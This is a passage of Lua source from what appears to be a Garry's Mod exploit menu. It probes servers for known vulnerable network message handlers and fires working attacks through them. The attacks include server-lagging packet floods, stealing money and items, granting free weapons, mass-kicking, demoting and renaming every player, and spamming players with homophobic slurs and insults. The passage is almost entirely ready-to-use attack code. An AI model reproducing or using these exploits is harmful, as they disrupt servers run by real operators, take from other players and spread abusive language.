	    addExploit("43", "BuilderXToggleKill", "old exploit, i dont remember what he was doing", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("BuilderXToggleKill")
	            net.WriteEntity(ply)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("reports.submit")

	if (status) then
	    ECPrint("Found Exploit: Report All [reports.submit]")

	    addExploit("44", "Report All", "Report all faggots", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("reports.submit")
	            net.WriteEntity(v)
	            net.WriteInt(5, 8)
	            net.WriteString("SuckMyDick")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("services_accept")

	if (status) then
	    ECPrint("Found Exploit: Infernus Service Accept [services_accept]")

	    addExploit("45", "Infernus Service Accept", "spam to all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("serviceaccept", 0, 0, function()
	            for k, v in pairs(player.GetAll()) do
	                net.Start("services_accept")
	                net.WriteString("Nice security, retards xd")
	                net.WriteVector(Vector(v:GetPos()))
	                net.WriteString("test image")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end)

	        timer.Simple(4, function()
	            timer.Destroy("serviceaccept")
	        end)
	    end)
	end

	status = ValidNetString("lockpick_sound")

	if (status) then
	    ECPrint("Found Exploit: LockPick Sound Spam [lockpick_sound]")

	    addExploit("46", "LockPick Sound Spam", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("spamlockpicksound", 3, 0, function()
	            for k, v in pairs(player.GetAll()) do
	                net.Start("lockpick_sound")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end)

	        timer.Simple(4, function()
	            timer.Destroy("spamlockpicksound")
	        end)
	    end)
	end

	status = ValidNetString("customprinter_get")

	if (status) then
	    ECPrint("Found Exploit: Realistic Printers Steal Money [customprinter_get]")

	    addExploit("47", "Realistic Printers Steal Money", "stealing money from printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass():find("print") then
	                net.Start("customprinter_get")
	                net.WriteEntity(v)
	                net.WriteString("g_money")
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("InformPlayer")

	if (status) then
	    ECPrint("Found Exploit: SimpleGrab Inform [InformPlayer]")

	    addExploit("48", "SimpleGrab Inform", "Spam all players in the console", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            for i = 0, 100 do
	                net.Start("InformPlayer")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("pogcp_report_submitReport")

	if (status) then
	    ECPrint("Found Exploit: Report All #2 [pogcp_report_submitReport]")

	    addExploit("49", "Report All #2", "Report all faggots", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for i = 0, 100 do
	            for k, v in pairs(player.GetAll()) do
	                net.Start("pogcp_report_submitReport")
	                net.WriteString("lol")
	                net.WriteString("nice security retards")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("1942_Fuhrer_SubmitCandidacy")

	if (status) then
	    ECPrint("Found Exploit: Fuhrer Submit Candidacy [1942_Fuhrer_SubmitCandidacy]")

	    addExploit("50", "Fuhrer Submit Candidacy", "you instantly become a Fuhrer, Sieg Heil", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("1942_Fuhrer_SubmitCandidacy")
	        net.WriteString(LocalPlayer():Nick())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("FacCreate")

	if (status) then
	    ECPrint("Found Exploit: Fac Create [FacCreate]")

	    addExploit("51", "Fac Create", "old exploit", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("fucklol", 1, 0, function()
	            net.Start("FacCreate")
	            net.WriteString("LOL " .. random_string(5))
	            net.WriteString("LOL " .. random_string(10))
	            net.WriteColor(random_color())
	            net.WriteBool(false)
	            net.WriteString(random_string(5))
	            net.SendToServer()
	        end)
	    end)
	end

	status = ValidNetString("FactionInviteConsole")

	if (status) then
	    ECPrint("Found Exploit: Faction Invite [FactionInviteConsole]")

	    addExploit("52", "Faction Invite", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lovedarkexploitsxd", 1, 0, function()
	            for k, v in pairs(player.GetAll()) do
	                net.Start("FactionInviteConsole")
	                net.WriteEntity(ply)
	                net.WriteEntity(table.Random(player.GetAll()))
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("WithdrewBMoney")

	if (status) then
	    ECPrint("Found Exploit: Free Money #2 [WithdrewBMoney]")

	    addExploit("53", "Free Money #2", "an exploit in the addon 'business'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("WithdrewBMoney")
	        net.WriteInt(50000, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("deathrag_takeitem")

	if (status) then
	    ECPrint("Found Exploit: Easy Items [deathrag_takeitem]")

	    addExploit("54", "Easy Items", "collects money, weapons", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        count = 0

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "prop_ragdoll" then
	                count = count + 1
	            end
	        end

	        if count == 0 then
	            ECPrint("No items found")
	        else
	            ECPrint("Amount of items " .. count)
	        end

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "prop_ragdoll" then
	                for i = 1, 10 do
	                    net.Start("deathrag_takeitem")
	                    net.WriteEntity(v)
	                    net.WriteInt(i, 16)
	                    net.SendToServer()
	                end
	            end
	        end
	    end)
	end

	status = ValidNetString("REPPurchase")

	if (status) then
	    ECPrint("Found Exploit: Heal and Armor [REPPurchase]")

	    addExploit("55", "Heal and Armor", "armor and hp", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if LocalPlayer():Health() < 99 then
	            net.Start("REPPurchase")
	            net.WriteString("HEALTH")
	            net.SendToServer()
	        end

	        if LocalPlayer():Armor() < 99 then
	            net.Start("REPPurchase")
	            net.WriteString("ARMOR")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("BTTTStartVotekick")

	if (status) then
	    ECPrint("Found Exploit: Votekick #2 [BTTTStartVotekick]")

	    addExploit("56", "Votekick #2", "kick all noobs", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("BTTTStartVotekick")
	                net.Start("_nonDBVMVote")
	                net.WriteEntity(v)
	                net.WriteString("")
	                net.WriteString("1")
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("Resupply")

	if (status) then
	    ECPrint("Found Exploit: Respawn Equipment [Resupply]")

	    addExploit("57", "Respawn Equipment", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Resupply")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DarkRP_Defib_ForceSpawn")

	if (status) then
	    ECPrint("Found Exploit: Respawn #2 [DarkRP_Defib_ForceSpawn]")

	    addExploit("58", "Respawn #2", "just respawn", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Respawn")
	        net.Start("DarkRP_Defib_ForceSpawn")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("FiremanLeave")

	if (status) then
	    ECPrint("Found Exploit: Fireman Leave [FiremanLeave]")

	    addExploit("59", "Fireman Leave", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("FiremanLeave")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("PoliceJoin")

	if (status) then
	    ECPrint("Found Exploit: Join the Police 1 [PoliceJoin]")

	    addExploit("60", "Join the Police 1", "joining the police", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("PoliceJoin")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("CreateEntity")

	if (status) then
	    ECPrint("Found Exploit: Create Entity [CreateEntity]")

	    addExploit("61", "Create Entity", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("CreateEntity")
	            net.WriteString("sent_arc_atm")
	            net.WriteFloat(100000000000000000000000000000000000000000000000000)
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("CREATE_REPORT")

	if (status) then
	    ECPrint("Found Exploit: CREATE REPORT [CREATE_REPORT]")

	    addExploit("62", "CREATE REPORT", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        local tab = {
	            REPORTER = v:Nick(),
	            REPORTERID = v:SteamID(),
	            FAGGOT = v:Nick(),
	            FAGGOTID = v:SteamID(),
	            INFO = "Say hi to youtube",
	            PROOF = "https://www.youtube.com/channel/UCmiP5W8BuaLzzGcJVKORErg"
	        }

	        for k, v in pairs(player.GetAll()) do
	            net.Start("CREATE_REPORT")
	            net.WriteTable(tab)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Hopping_Test")

	if (status) then
	    ECPrint("Found Exploit: Hopping Test [Hopping_Test]")

	    addExploit("62", "Hopping Test", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("Hopping_Test")
	            net.WriteEntity(v)
	            net.WriteString("69.696.696969.69")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("CpForm_Answers")

	if (status) then
	    ECPrint("Found Exploit: Join the Police 2 [CpForm_Answers]")

	    addExploit("63", "Join the Police 2", "joining the police #2", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("CpForm_Answers")
	        net.WriteEntity(LocalPlayer())
	        net.WriteTable({})
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("VehicleUnderglow")

	if (status) then
	    ECPrint("Found Exploit: Vehicle Underglow [VehicleUnderglow]")

	    addExploit("64", "Vehicle Underglow", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("VehicleUnderglow")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("OpenGates")

	if (status) then
	    ECPrint("Found Exploit: Open Door #2 [OpenGates]")

	    addExploit("65", "Open Door #2", "Force open the door you are looking at", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("OpenGates")
	        net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("DemotePlayer")

	if (status) then
	    ECPrint("Found Exploit: Demote All Players [DemotePlayer]")

	    addExploit("66", "Demote All Players", "Demote all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("DemotePlayer")
	            net.WriteString(v:SteamID())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("SendMail")

	if (status) then
	    ECPrint("Found Exploit: Send Mail [SendMail]")

	    addExploit("67", "Send Mail", "sending mail to all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("SendMail")
	            net.WriteString("haha nice security retards")
	            net.WriteString(v:Nick())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("REPAdminChangeLVL")

	if (status) then
	    ECPrint("Found Exploit: Admin Change Level [REPAdminChangeLVL]")

	    addExploit("68", "Admin Change Level", "free lvl", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("REPAdminChangeLVL")
	            net.WriteEntity(v)
	            net.WriteDouble(1090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("BuyUpgradesStuff")

	if (status) then
	    ECPrint("Found Exploit: Buy Upgrades [BuyUpgradesStuff]")

	    addExploit("69", "Buy Upgrades", "free upgrades", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("BuyUpgradesStuff")
	        net.WriteString("")
	        net.WriteFloat(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SquadGiveWeapon")

	if (status) then
	    ECPrint("Found Exploit: Give Weapons [SquadGiveWeapon]")

	    addExploit("70", "Give Weapons", "easy weapon", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Choose a weapon!")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("ls_sniper")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Giving Weapon")
	            net.Start("SquadGiveWeapon")
	            net.WriteString(self:GetValue())
	            net.WriteEntity(LocalPlayer())
	            net.SendToServer()
	            inputFrame:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("SetTableTarget")

	if (status) then
	    ECPrint("Found Exploit: Set Table Target [SetTableTarget]")

	    addExploit("71", "Set Table Target", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("SetTableTarget")
	        net.WriteString("pername")
	        net.WriteString("perjob")
	        net.WriteInt(-10000000000000, 32)
	        net.WriteString("hitmansel")
	        net.WriteString("Anony.")
	        net.WriteString("")
	        net.WriteFloat(0)
	        net.WriteInt(-10000000000000, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("UpdateRPUModelSQL")

	if (status) then
	    ECPrint("Found Exploit: Change character model [UpdateRPUModelSQL]")

	    addExploit("72", "Change character model", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("UpdateRPUModelSQL")
	        net.WriteString(LocalPlayer():GetEyeTrace().Entity:GetModel())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("disguise")

	if (status) then
	    ECPrint("Found Exploit: Disguise [disguise]")

	    addExploit("73", "Disguise", "allows you to disguise as any job", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter the number of the job")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("5")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Disguised")
	            net.Start("disguise")
	            net.WriteInt(tonumber(self:GetValue()), 32)
	            net.SendToServer()
	            inputFrame:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("gportal_rpname_change")

	if (status) then
	    ECPrint("Found Exploit: Your RP Name #1 [gportal_rpname_change]")

	    addExploit("74", "Your RP Name #1", "allows you to put absolutely any rp name", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter your name")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Changed")
	            net.Start("gportal_rpname_change")
	            net.WriteString((self:GetValue()), 32)
	            net.WriteString(" ")
	            net.SendToServer()
	            inputFrame:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("NewRPNameSQL")

	if (status) then
	    ECPrint("Found Exploit: Your RP Name #2 [NewRPNameSQL]")

	    addExploit("75", "Your RP Name #2", "allows you to put absolutely any rp name", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter your name")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Changed")
	            net.Start("NewRPNameSQL")
	            net.WriteString((self:GetValue()), 32)
	            net.SendToServer()
	            inputFrame:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("chname")

	if (status) then
	    ECPrint("Found Exploit: Your RP Name #3 [chname]")

	    addExploit("76", "Your RP Name #3", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter your name")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Changed")
	            net.Start("chname")
	            net.WriteString((self:GetValue()))
	            net.WriteString(" ")
	            net.SendToServer()
	            inputFrame:SetVisible(false)
	        end
	    end)
	end

	status = ValidNetString("AbilityUse")

	if (status) then
	    ECPrint("Found Exploit: Free Bonus [AbilityUse]")

	    addExploit("77", "Free Bonus", "allows you to instantly get bonuses", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        for k, v in ipairs(rp.abilities.list) do
	            ECPrint("ID - " .. k .. " | " .. v:GetName())
	            inputFrameExists = true
	            inputFrame = vgui.Create("DFrame")
	            inputFrame:SetTitle("Enter the id of the bonus")
	            inputFrame:SetSize(400, 75)
	            inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	            inputFrame:SetDraggable(false)
	            inputFrame:ShowCloseButton(true)
	            inputFrame:MakePopup()

	            inputFrame.Paint = function(self, w, h)
	                draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	            end

	            local TextEntry = vgui.Create("DTextEntry", inputFrame)
	            TextEntry:SetSize(380, 30)
	            TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	            TextEntry:SetText("6")

	            TextEntry.OnEnter = function(self)
	                surface.PlaySound("garrysmod/ui_click.wav")
	                ECNotify("Received")
	                net.Start("AbilityUse")
	                net.WriteInt(tonumber(self:GetValue()), 32)
	                net.SendToServer()
	                inputFrame:SetVisible(false)
	            end
	        end
	    end)
	end

	status = ValidNetString("race_accept")

	if (status) then
	    ECPrint("Found Exploit: Get Car [race_accept]")

	    addExploit("78", "Get Car", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter the id of the car")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("1")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Starting")
	            net.Start("race_accept")
	            net.WriteInt(tonumber(self:GetValue()), 32)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NLR_SPAWN")

	if (status) then
	    ECPrint("Found Exploit: Respawn #3 [NLR_SPAWN]")

	    addExploit("79", "Respawn #3", "instant revival", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("NLR_SPAWN")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("Kun_ZiptieStruggle")

	if (status) then
	    ECPrint("Found Exploit: Break Handcuffs [Kun_ZiptieStruggle]")

	    addExploit("80", "Break Handcuffs", "Instantly breaks the handcuffs", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for i = 0, 30 do
	            net.Start("Kun_ZiptieStruggle")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("JB_Votekick")

	if (status) then
	    ECPrint("Found Exploit: Abuses Jailbreak Votekick [JB_Votekick]")

	    addExploit("81", "Abuses Jailbreak Votekick", "kick all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("JB_Votekick")
	            net.WriteEntity(v)
	            net.WriteString("what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? ")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Letthisdudeout")

	if (status) then
	    ECPrint("Found Exploit: ByB Force Bail [Letthisdudeout]")

	    addExploit("82", "ByB Force Bail", "exploit on all Byb servers to bail yourself out", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("Letthisdudeout")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("opr_withdraw")

	if (status) then
	    ECPrint("Found Exploit: Lagger #14 [opr_withdraw]")

	    addExploit("83", "Lagger #14", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger14", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("opr_withdraw", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("NC_GetNameChange")

	if (status) then
	    ECPrint("Found Exploit: Change all names [NC_GetNameChange]")

	    addExploit("84", "Change all names", "allows you to change the rp names of all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        inputFrameExists = true
	        inputFrame = vgui.Create("DFrame")
	        inputFrame:SetTitle("Enter the name")
	        inputFrame:SetSize(400, 75)
	        inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230)
	        inputFrame:SetDraggable(false)
	        inputFrame:ShowCloseButton(true)
	        inputFrame:MakePopup()

	        inputFrame.Paint = function(self, w, h)
	            draw.RoundedBox(5, 0, 0, w, h, Color(30, 30, 30))
	        end

	        local TextEntry = vgui.Create("DTextEntry", inputFrame)
	        TextEntry:SetSize(380, 30)
	        TextEntry:SetPos(inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2)
	        TextEntry:SetText("AHAHAHAHAH")

	        TextEntry.OnEnter = function(self)
	            surface.PlaySound("garrysmod/ui_click.wav")
	            ECNotify("Starting")

	            for k, v in pairs(player.GetAll()) do
	                net.Start("NC_GetNameChange")
	                net.WriteEntity(v)
	                net.WriteString((self:GetValue()))
	                net.WriteString((self:GetValue()))
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("revival_revive_accept")

	if (status) then
	    ECPrint("Found Exploit: Reanimation #2 [revival_revive_accept]")

	    addExploit("85", "Reanimation #2", "instant revival, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("exploit_revive") then
	            ECNotify("Enabled")

	            timer.Create("exploit_revive", 0.5, 0, function()
	                if not LocalPlayer():Alive() then
	                    net.Start("revival_revive_accept")
	                    net.SendToServer()
	                end
	            end)
	        else
	            timer.Remove("exploit_revive")
	            ECNotify("Disabled")
	        end
	    end)
	end

	status = ValidNetString("join_disconnect")

	if (status) then
	    ECPrint("Found Exploit: Lagger #15 [join_disconnect]")

	    addExploit("86", "Lagger #15", "b1g lags my duder", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger15") then
	            timer.Create("lagger15", 0.5, 0, function()
	                for i = 1, 3000 do
	                    net.Start("join_disconnect", true)
	                    net.WriteEntity(table.Random(player.GetAll()))
	                    net.SendToServer()
	                end
	            end)
	        else
	            timer.Remove("lagger15")
	            ECNotify("Stopping")
	        end
	    end)
	end

	status = ValidNetString("BuyFirstTovar")

	if (status) then
	    ECPrint("Found Exploit: Free Physgun [BuyFirstTovar]")

	    addExploit("87", "Free Physgun", "get physgun", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Take physgun")
	        net.Start("BuyFirstTovar")
	        net.WriteString("0")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("BuySecondTovar")

	if (status) then
	    ECPrint("Found Exploit: Free Gravitygun [BuySecondTovar]")

	    addExploit("88", "Free Gravitygun", "get gravitygun", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Take gravitygun")
	        net.Start("BuySecondTovar")
	        net.WriteString("0")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("MONEY_SYSTEM_GetWeapons")

	if (status) then
	    ECPrint("Found Exploit: Give Weapons #2 [MONEY_SYSTEM_GetWeapons]")

	    addExploit("89", "Give Weapons #2", "get weapons", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for i = 1, 32 do
	            net.Start("MONEY_SYSTEM_GetWeapons")
	            net.WriteInt(i, 8)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("MCon_Demote_ToServer")

	if (status) then
	    ECPrint("Found Exploit: Demote All Players #2 [MCon_Demote_ToServer]")

	    addExploit("90", "Demote All Players #2", "demote all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("MCon_Demote_ToServer")
	            net.WriteString(v:SteamID())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("withdrawMoney")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #3 [withdrawMoney]")

	    addExploit("91", "Steal All Monies #3", "withdraw money from all printers, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("withdrawMoney")
	            net.WriteEntity(v)
	            net.SendToServer()
